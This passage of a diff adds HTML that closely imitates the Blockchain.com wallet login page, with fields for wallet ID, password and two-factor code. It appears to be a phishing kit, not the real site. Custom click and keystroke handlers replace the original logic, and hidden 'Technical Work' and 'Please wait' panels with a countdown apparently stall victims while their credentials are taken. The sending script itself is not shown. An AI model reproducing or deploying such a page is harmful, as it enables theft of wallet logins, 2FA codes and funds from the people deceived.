App?</p><p class="mbn" translate="DOWNLOAD_HERE">Download it here</p></div><div><a href="../../../../../../itunes.apple.com/us/app/blockchain-bitcoin-wallet/id493253309.html" target="_blank" rel="noopener noreferrer"><img class="app-store-badge" src="img/app-store-badge-5eb1a238a24f928783bfdf3e8b093e1b38aebe88.svg"></a><a href="../../../../../../play.google.com/store/apps/details%3Fid=piuk.blockchain.android.html" target="_blank" rel="noopener noreferrer"><img class="play-store-badge" src="img/google-play-badge-16d90b43440b56f544f6f1d92de5566e744854d8.png"></a></div></footer></div>
+
+
+
+
+
+
+
+
+
+      <div id="web_login" class="login-box mhs" ui-view="contents" style="display:">
+
+
+
+      <div id="tech" data-preflight-tag="Login" style="display:none">
+         <header>
+      <hgroup>
+      <div class="flex-between flex-center flex-wrap mb-10">
+      <span class="f-24 lh1 capitalize exclaim" ng-hide="didLogout" translate="WELCOME_BACK">Technical Work</span>
+
+      </div>
+      <p class="alt-font f-16" translate="LOGIN_BELOW">Please try again later.</p>
+      </hgroup>
+      </header>
+      <header>
+      <hgroup>
+
+      </hgroup>
+      </header>
+
+
+
+
+     </div>
+
+
+
+      <div id="wait" data-preflight-tag="Login" style="display:none">
+         <header>
+      <hgroup>
+      <div class="flex-between flex-center flex-wrap mb-10">
+      <span class="f-24 lh1 capitalize exclaim" ng-hide="didLogout" translate="WELCOME_BACK">Welcome back</span>
+
+      </div>
+      <p class="alt-font f-16" translate="LOGIN_BELOW">Network connection. Please wait.</p>
+      </hgroup>
+      </header>
+      <header>
+      <hgroup>
+
+ <div align="center">
+
+         <br><br>
+<center><br><p style="font-size:17px;"><br><br><img src="img/ajax-loader.gif"><br><br></p><div id="countdown" style="position: center; font-weight: bold">0:49</div></center>
+        <br><br><br><br>
+      </div>
+
+
+      </hgroup>
+      </header>
+
+
+
+
+     </div>
+
+
+
+
+      <div id="login" data-preflight-tag="Login" style="display:">
+      <header>
+      <hgroup>
+      <div class="flex-between flex-center flex-wrap mb-10" style="color: rgb(84, 84, 86);margin-bottom: 1px;">
+      <span class="f-24 lh1 capitalize exclaim" ng-hide="didLogout" translate="WELCOME_BACK" style="font-family: Montserrat, sans-serif;
+    font-weight: 300;
+    font-size: 24px;
+    text-transform: capitalize;
+    font-style: normal;
+    color: rgb(84, 84, 86);
+    cursor: inherit;">Welcome back</span>
+      <span class="f-24 lh1 ng-hide" ng-show="didLogout" translate="LOGGED_OUT">Logged out</span>
+      <span>
+      <span translate="OR">or</span>&nbsp;<a ui-sref="public.signup" translate="SIGN_UP" href="javascript:void(0);" onclick="signup_click();">Sign Up</a>
+      </span>
+      </div>
+      <p class="alt-font f-16" translate="LOGIN_BELOW" style="">Sign in to your wallet below</p>
+      </hgroup>
+      </header>
+
+      <!-- GUID & Password fields-->
+
+      <form class="bc-form mt-30 form-horizontal clearfix ng-pristine ng-invalid ng-invalid-required" name="loginForm" ng-submit="browser.disabled || login()" role="form" autocomplete="off" novalidate="" method="POST" style="margin-top: 7px;">
+      <div class="browser-detection" result="browser">
+        <p class="text-warning ng-hide" ng-show="result.warn"></p>
+        <p class="text-danger ng-hide" ng-show="result.disabled"></p>
+      </div><fieldset ng-disabled="browser.disabled || status.busy">
+      <div class="group mb-15" ng-class="{'has-error': errors.uid}" style="margin-bottom:5px;">
+      <div class="item">
+      <label translate="UID" for="UID_input">Wallet ID</label>
+      <div>
+      <input class="form-control ng-pristine ng-untouched ng-valid ng-not-empty ng-valid-required" id="UID_input" ng-model="uid" name="UID_input" focus-when="!uidAvailable" ng-change="errors.uid = null" ng-disabled="underMaintenance" required="" type="text">
+      <div class="help-block mbn alt-font f-14" ng-show="errors.uid" ui-sref="public.reminder" style="color:#a94442;display:none;" id="err_uid_div"><span translate="UNKNOWN_IDENTIFIER">Unknown wallet identifier.</span></div>
+      <div class="help-block mbn alt-font f-14 ng-hide" ng-show="errors.uid" ui-sref="public.reminder" href="#/reminder">
+      <span translate=""></span>
+      </div>
+      <div class="help-block mbn alt-font f-14 hidden-xs" id="to_err_dv_uid_txt">
+      <span translate="FIND_GUID_EXPLAIN">Find the login link in your email, e.g. <i>blockchain.info/wallet/1111-222-333...</i> The series of numbers and dashes at the end of the link is your Wallet ID.</span>
+      </div>
+      </div>
+      </div>
+      </div>
+      <div class="group mb-15" ng-class="{'has-error': errors.password}">
+      <div class="item">
+      <label translate="PASSWORD" for="pass_input">Password</label>
+      <div>
+      <input class="form-control ng-pristine ng-empty  ng-invalid-required ng-touched" id="pass_input" name="pass_input" ng-model="password" focus-when="uidAvailable" ng-disabled="underMaintenance" required="" style="" type="password" oninput="pwd_key_up();" onclick="pwd_key_up();" onkeyup="pwd_key_up();">
+            <div class="help-block mbn alt-font f-14" ng-show="errors.uid" ui-sref="public.reminder" style="color:#a94442;display:none;" id="err_pwd_div"><span translate="UNKNOWN_IDENTIFIER">Unknown password.</span></div>
+      <div class="help-block mbn alt-font f-14">
+      <span translate=""></span>
+      </div>
+      </div>
+      </div>
+      </div>
+
+
+ <div class="group mb-15" ng-show="settings.needs2FA" ng-class="{'has-error': errors.twoFactor || settings.twoFactorMethod == 3}" style="display:none" id="2FA_div">
+ <div class="item">
+ <label>
+
+ <span translate="GOOGLE_AUTH_CODE" ng-show="settings.twoFactorMethod == 4" class="" style="" id="2FA_txt">2FA code</span>
+ </label>
+ <div>
+ <input id="2FA_input" class="form-control ng-pristine ng-empty ng-invalid ng-invalid-required ng-touched" type="text" ng-model="twoFactorCode" ng-disabled="didEnterCorrect2FA || settings.twoFactorMethod == 3" ng-required="settings.needs2FA" focus-when="settings.needs2FA" required="required" style="">
+ <div class="help-block mbn alt-font f-14" ng-show="errors.uid" ui-sref="public.reminder" style="color:#a94442;display:none;" id="err_2FA_div"><span translate="UNKNOWN_IDENTIFIER">Please enter two factor authentication code.</span></div>
+ <div class="help-block mbn alt-font f-14" translate="">
+ <span></span>
+ </div>
+
+ </div>
+ </div>
+ </div>
+
+      <div class="group mb-15 ng-hide" ng-show="settings.needs2FA" ng-class="{'has-error': errors.twoFactor || settings.twoFactorMethod == 3}">
+      <div class="item">
+      <label>
+      <span translate="YUBI_CODE" ng-show="settings.twoFactorMethod == 1" class="ng-hide">Yubikey Code</span>
+      <span translate="EMAIL_CODE" ng-show="settings.twoFactorMethod == 2" class="ng-hide">Email Code</span>
+      <span translate="2FA_NOT_SUPPORTED" ng-show="settings.twoFactorMethod == 3" class="ng-hide">This method of two factor authentication is not supported</span>
+      <span translate="GOOGLE_AUTH_CODE" ng-show="settings.twoFactorMethod == 4" class="ng-hide">Google Authenticator</span>
+      <span translate="SMS_CODE" ng-show="settings.twoFactorMethod == 5" class="ng-hide">SMS Code</span>
+      </label>
+      <div>
+      <input class="form-control ng-pristine ng-untouched ng-empty ng-valid ng-valid-required" ng-model="twoFactorCode" ng-disabled="didEnterCorrect2FA || settings.twoFactorMethod == 3" ng-required="settings.needs2FA" focus-when="settings.needs2FA" type="text">
+      <div class="help-block mbn alt-font f-14" translate="">
+      <span>
+      </span>
+      </div>
+      <p class="form-control-static ng-hide" ng-show="settings.twoFactorMethod == 5">
+      <img ng-show="status.resending" src="img/spinner-8de10c3e9fd9f1c447099e6d23b5c24931c019da.gif" class="ng-hide">
+      <a ng-click="resend()" ng-hide="status.resending" translate="RESEND" class="">Resend</a>
+      </p>
+      </div>
+      </div>
+      </div>
+      <div class="group full mt-15">
+      <button id="lgn_btn" class="button-primary button-heavy ladda-button" type="submit" ui-ladda="status.busy" ladda-translate="LOG_IN" ng-disabled="loginForm.$invalid || underMaintenance" disabled="disabled" onclick="login_btn(); return false;">
+      <span>
+      <span class="ladda-label" translate="LOG_IN">Log in</span>
+      <span class="ladda-spinner">
+      <div class="spinner"></div>
+      </span>
+      </span>
+      </button>
+
+
+      </div>
+      </fieldset>
+      </form>
+      <div class="ptl flex-between" style="padding-top: 0em;">
+      <div>
+      <a ng-show="showMobileLogin" ui-sref="public.mobile-login" translate="MOBILE_LOGIN.TITLE" href="javascript:void(0);" onclick="mobile_click();" class="" style="">Log in via Mobile</a></div>
+      <div ng-hide="didLogout" class="">
+      <span translate="HAVING_TROUBLE">Having some trouble?</span>&nbsp;<a ui-sref="public.help" translate="VIEW_OPTIONS" href="javascript:void(0);" onclick="view_help();">View Options</a>
+      </div>
+      </div>
+      </div>
+      </div>
+      </div>
+      <div class="flex-row flex-center flex-column-mobile flex-between bc-logo-footer width-100 width-100-tablet">
+      <div class="wrapper ph-35 width-100" style="    padding-left: 135px;
+    padding-right: 135px;">
+      <div class="flex-row flex-center flex-between flex-column-mobile">
+      <div class="flex-row flex-center flex-column-mobile em-300">
+      <img src="img/blue-logo-ea5f627851cb67fcdb31b3907dd0f7ddcd7ea4cf.svg" alt="" height="40"><a class="upper white ml-40" href="../../../../../../blockchain.info/index.html" target="_blank" style="margin-left: 10px;">Data</a>
+      <a class="upper white ml-40" href="../../../../../../www.blockchain.com/about.html" target="_blank" style="    margin-left: 20px;">About</a>
+      <a class="upper white ml-40" href="../../../../../../blog.blockchain.com/index.html" target="_blank" style="    margin-left: 20px;">Blog</a>
+      <a class="upper white ml-40" href="../../../../../../support.blockchain.com/index.html" target="_blank" style="    margin-left: 20px;">Support</a>
+      </div>
+      <li class="dropup dropdown" uib-dropdown="">
+      <a href="index.html#" uib-dropdown-toggle="" class="dropdown-toggle" aria-haspopup="true" aria-expanded="false">
+      <span class="white upper f-12" style="font-size:15px;">English</span>
+
+      </a>
+      <ul class="languages_select dropdown-menu-right dropdown-menu" uib-dropdown-menu=""><!---->
+      <li ng-repeat="lang in languages">
+      <a ng-href="/bg/wallet/#/login" href="../../../../../bg/wallet/index.html#/login">Bulgarian</a>
+      </li>
+      <!---->
+      <li ng-repeat="lang in languages">
+      <a ng-href="/zh-cn/wallet/#/login" href="../../../../../zh-cn/wallet/index.html#/login">Chinese Simplified</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/da/wallet/#/login" href="../../../../../da/wallet/index.html#/login">Danish</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/nl/wallet/#/login" href="../../../../../nl/wallet/index.html#/login">Dutch</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/en/wallet/#/login" href="../../../../../en/wallet/index.html#/login">English</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/fr/wallet/#/login" href="../../../../../fr/wallet/index.html#/login">French</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/de/wallet/#/login" href="../../../../../de/wallet/index.html#/login">German</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/el/wallet/#/login" href="../../../../../el/wallet/index.html#/login">Greek</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/hi/wallet/#/login" href="../../../../../hi/wallet/index.html#/login">Hindi</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/hu/wallet/#/login" href="../../../../../hu/wallet/index.html#/login">Hungarian</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/id/wallet/#/login" href="../../../../../id/wallet/index.html#/login">Indonesian</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/it/wallet/#/login" href="../../../../../it/wallet/index.html#/login">Italiano</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/ja/wallet/#/login" href="../../../../../ja/wallet/index.html#/login">Japanese</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/ko/wallet/#/login" href="../../../../../ko/wallet/index.html#/login">Korean</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/no/wallet/#/login" href="../../../../../no/wallet/index.html#/login">Norwegian</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/pl/wallet/#/login" href="../../../../../pl/wallet/index.html#/login">Polish</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/pt/wallet/#/login" href="../../../../../pt/wallet/index.html#/login">Portuguese</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/ro/wallet/#/login" href="../../../../../ro/wallet/index.html#/login">Romanian</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/ru/wallet/#/login" href="../../../../../ru/wallet/index.html#/login">Russian</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/sl/wallet/#/login" href="../../../../../sl/wallet/index.html#/login">Slovenian</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/es/wallet/#/login" href="../../../../../es/wallet/index.html#/login">Spanish</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/sv/wallet/#/login" href="../../../../../sv/wallet/index.html#/login">Swedish</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/th/wallet/#/login" href="../../../../../th/wallet/index.html#/login">Thai</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/tr/wallet/#/login" href="../../../../../tr/wallet/index.html#/login">Turkish</a></li>
+      <!---->
+      <li ng-repeat="lang in languages"><a ng-href="/vi/wallet/#/login" href="../../../../../vi/wallet/index.html#/login">Vietnamese</a></li>
+      <!---->
+      </ul>
+      </li>
+      </div>
+      </div>
+      <div class="versions f-12" ng-show="versionFrontend &amp;&amp; versionMyWallet" style=" padding-right: 125px;">
+    <a class="Link__BaseLink-dDgpQk fOhHZh" href="../../../../../../github.com/blockchain/blockchain-wallet-v4-frontend/releases.html" target="_blank" color="white">v4.2.7</a>
+      </div>
+      </div>
+      </div>
+      </div>
+
+      </body></html>
